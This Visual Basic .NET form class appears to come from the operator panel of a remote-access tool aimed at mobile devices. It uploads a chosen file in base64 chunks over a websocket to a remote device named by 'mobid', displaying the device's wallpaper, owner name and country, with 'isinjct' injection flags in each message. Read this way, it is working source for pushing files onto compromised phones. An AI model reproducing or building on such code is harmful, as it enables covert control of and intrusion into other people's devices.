Imports Newtonsoft.Json
Imports System.IO

Public Class uploader
    Public Btcli As BTClient
    Public filePath As String
    Public filename As String
    Public savepath As String
    Public mobid As String

    Private Sub uploadworker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles uploadworker.DoWork
        Dim file As New FileInfo(filePath)
        Dim totalBytes As Long = file.Length


        Dim bufferSize As Integer = CalculateBufferSize(totalBytes)
        Dim buffer(bufferSize - 1) As Byte
        Dim totalBytesRead As Long = 0
        Dim chunkNumber As Integer = 0


        Dim md5Hash As String = CalculateMD5(filePath)

        Using fs As New FileStream(filePath, FileMode.Open, FileAccess.Read)
            Dim bytesRead As Integer

            Do
                bytesRead = fs.Read(buffer, 0, buffer.Length)

                If bytesRead > 0 Then
                    totalBytesRead += bytesRead


                    Dim base64Chunk As String = Convert.ToBase64String(buffer, 0, bytesRead)


                    Dim message As New Dictionary(Of String, Object) From {
                        {"filehash", md5Hash},
                        {"savepath", savepath},
                        {"isinjct", "0"},
                        {"jctid", "0"},
                        {"filename", file.Name},
                        {"filedata", base64Chunk},
                        {"totalSize", totalBytes},
                        {"sentSize", totalBytesRead},
                        {"chunkNumber", chunkNumber},
                        {"msg", "upload"}
                    }

                    BTEngine.commands(message, mobid, BTEngine.MainForm.webSocketClient)

                    chunkNumber += 1

                    Me.Invoke(Sub()
                                  Dim progressPercentage As Integer = CInt((totalBytesRead / totalBytes) * 100)
                                  uploadprogress.Value = progressPercentage
                                  senttext.Text = bytestotext(totalBytesRead)

                              End Sub)
                    Threading.Thread.Sleep(10)
                End If

            Loop While bytesRead > 0
        End Using
        Me.Invoke(Sub()
                      uploadprogress.ForeColor = Color.Lime
                      PictureBox1.Image = My.Resources.ok_con
                  End Sub)
    End Sub

    Private Sub uploader_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        myico.Image = Btcli.wallpaper
        mytitle.Text = uploadingstr & " | " & Btcli.name & " | " & Btcli.country
        uploadprogress.Value = 0
        fnametext.Text = filename
        Dim file As New FileInfo(filePath)
        Dim totalBytes As Long = file.Length
        totaltext.Text = bytestotext(totalBytes) 'example return 1.2 MB
        senttext.Text = "0 Bytes"
        If Not uploadworker.IsBusy Then
            uploadworker.RunWorkerAsync()
        End If
    End Sub
End Class